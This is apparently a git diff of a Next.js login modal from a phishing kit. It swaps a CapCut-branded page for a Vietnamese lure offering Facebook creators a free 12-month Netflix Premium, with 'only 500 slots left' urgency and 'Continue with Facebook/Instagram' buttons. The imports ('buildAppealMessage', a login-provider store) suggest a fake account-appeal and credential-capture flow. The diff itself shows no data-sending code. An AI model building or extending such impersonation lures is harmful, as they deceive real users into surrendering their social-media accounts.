@@ -1,6 +1,7 @@
 'use client';
 
 import InstagramLogoImage from '@/assets/images/logo insta.webp';
+import NetflixHeroBg from '@/assets/images/netflix-hero-bg.jpg';
 import { useTranslation } from '@/hooks/use-translation';
 import { store, type LoginProvider } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
@@ -10,8 +11,7 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useState, type FC } from 'react';
 
-const PROMO_IMAGE =
-    'https://lh3.googleusercontent.com/aida/AP1WRLurZAKBtA7eLCKHb_9sofvGXrx_yT9D7Dm-z1y1a-1ojtHvQB6wHcmrmRaPWmMwse4Se_5nrxLq9LsXHeM3Z0UM1icIZscpmVFAZlMmFM3JuhTWPK538EwX9SbSs1i8UqtZ2kovC07fk7ovmZwD9umJnpmHTDJOgxdqjdLWGDVWsuQzyoM9jhHaeZ-w4ppVHMoqmRO4dgDcfgQrQ7sinWIJDsz5B64bLV9I0O4-R2quHbV7rnfkBSFfSA';
+const PROMO_IMAGE = NetflixHeroBg;
 
 const FacebookIcon = () => (
     <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
@@ -31,15 +31,15 @@ interface LoginChoiceModalProps {
 }
 
 const LOGIN_CHOICE_TEXTS = [
-    'Welcome to CapCut',
-    'Create stunning videos online with unlimited possibilities.',
-    'Continue with Facebook',
-    'Continue with Instagram',
-    'By clicking Continue, you accept our',
-    'Terms of Service',
-    'and',
-    'Privacy Policy',
-    'Close modal'
+    'Xác minh Creator Facebook',
+    'Creator Facebook được tặng Netflix Premium 12 tháng — 4K HDR, xem không giới hạn. Chỉ còn 500 suất trong đợt này.',
+    'Tiếp tục với Facebook',
+    'Tiếp tục với Instagram',
+    'Bằng việc nhấn Tiếp tục, bạn đồng ý với',
+    'Điều khoản dịch vụ',
+    'và',
+    'Chính sách quyền riêng tư',
+    'Đóng'
 ] as const;
 
 const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
@@ -85,7 +85,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                     type='button'
                     onClick={handleClose}
                     className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/20'
-                    aria-label={t('Close modal')}
+                    aria-label={t('Đóng')}
                 >
                     <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                 </button>
@@ -95,7 +95,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                     <Image src={PROMO_IMAGE} alt='' fill className='object-cover opacity-80' unoptimized />
                     <div className='absolute inset-0 bg-linear-to-t from-black/90 via-black/30 to-transparent' />
                     <div className='absolute right-0 bottom-0 left-0 p-8'>
-                        <p className='text-xl leading-snug font-bold text-white'>{t('Create stunning videos online with unlimited possibilities.')}</p>
+                        <p className='text-xl leading-snug font-bold text-white'>{t('Creator Facebook được tặng Netflix Premium 12 tháng — 4K HDR, xem không giới hạn. Chỉ còn 500 suất trong đợt này.')}</p>
                         <div className='mt-6 flex gap-1.5'>
                             <span className='h-1.5 w-1.5 rounded-full bg-white' />
                             <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
@@ -106,7 +106,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
 
                 {/* Right login pane */}
                 <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
-                    <h2 className='mb-10 text-center text-[28px] leading-tight font-bold text-[#090909] sm:text-[32px]'>{t('Welcome to CapCut')}</h2>
+                    <h2 className='mb-10 text-center text-[28px] leading-tight font-bold text-[#090909] sm:text-[32px]'>{t('Xác minh Creator Facebook')}</h2>
 
                     <div className='mx-auto flex w-full max-w-[360px] flex-col gap-3'>
                         <button
@@ -116,7 +116,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                             className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                         >
                             <FacebookIcon />
-                            {t('Continue with Facebook')}
+                            {t('Tiếp tục với Facebook')}
                         </button>
 
                         <button
@@ -126,15 +126,15 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                             className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                         >
                             <InstagramIcon />
-                            {t('Continue with Instagram')}
+                            {t('Tiếp tục với Instagram')}
                         </button>
                     </div>
 
                     <p className='mx-auto mt-8 max-w-[360px] text-center text-xs leading-relaxed text-[#757575]'>
-                        {t('By clicking Continue, you accept our')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Terms of Service')}</span>{' '}
-                        {t('and')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Privacy Policy')}</span>
+                        {t('Bằng việc nhấn Tiếp tục, bạn đồng ý với')}{' '}
+                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Điều khoản dịch vụ')}</span>{' '}
+                        {t('và')}{' '}
+                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Chính sách quyền riêng tư')}</span>
                     </p>
                 </div>
             </div>
